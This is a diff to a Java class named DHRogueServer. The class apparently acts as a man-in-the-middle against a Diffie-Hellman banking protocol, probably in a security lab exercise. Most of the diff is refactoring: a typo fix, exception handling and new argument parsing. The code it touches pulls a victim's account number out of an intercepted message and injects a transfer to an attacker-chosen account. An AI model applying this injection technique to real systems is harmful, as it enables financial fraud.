@@ -15,7 +15,6 @@ import java.security.PublicKey;
 import java.security.spec.InvalidParameterSpecException;
 import java.security.spec.X509EncodedKeySpec;
 import java.text.MessageFormat;
-import java.util.Scanner;
 
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
@@ -26,7 +25,7 @@ import javax.crypto.spec.DHParameterSpec;
 import sun.misc.BASE64Decoder;
 import sun.misc.BASE64Encoder;
 
-public class DHRougueServer {
+public class DHRogueServer {
 
 	public static void usage() {
 		System.err
@@ -44,13 +43,19 @@ public class DHRougueServer {
 		if (args.length != 5)
 			usage();
 
-		listenPort = Integer.parseInt(args[0]);
-		server = args[1];
-		serverPort = Integer.parseInt(args[2]);
-		destAccountNumber = Long.parseLong(args[3]);
-		amount = Integer.parseInt(args[4]);
+		try {
+			listenPort = Integer.parseInt(args[0]);
+			server = args[1];
+			serverPort = Integer.parseInt(args[2]);
+			destAccountNumber = Long.parseLong(args[3]);
+			amount = Integer.parseInt(args[4]);
 
-		server(listenPort, server, serverPort, destAccountNumber, amount);
+			server(listenPort, server, serverPort, destAccountNumber, amount);
+
+		} catch (Exception e) {
+			e.printStackTrace();
+			System.exit(1);
+		}
 	}
 
 	private static void server(int listenPort, String server, int serverPort,
@@ -61,10 +66,8 @@ public class DHRougueServer {
 
 		// Get source account number from msg
 		String msg = credAndMsg[0];
-		Scanner sc = new Scanner(msg);
-		sc.useDelimiter("[^0-9]+");
-		sc.nextLong();
-		long sourceAccountNumber = sc.nextLong();
+		String[] msgSplit = msg.split("[^0-9]+");
+		long sourceAccountNumber = Long.parseLong(msgSplit[2]);
 
 		// Send the injected message
 		client(server, serverPort, credAndMsg[1], credAndMsg[2],
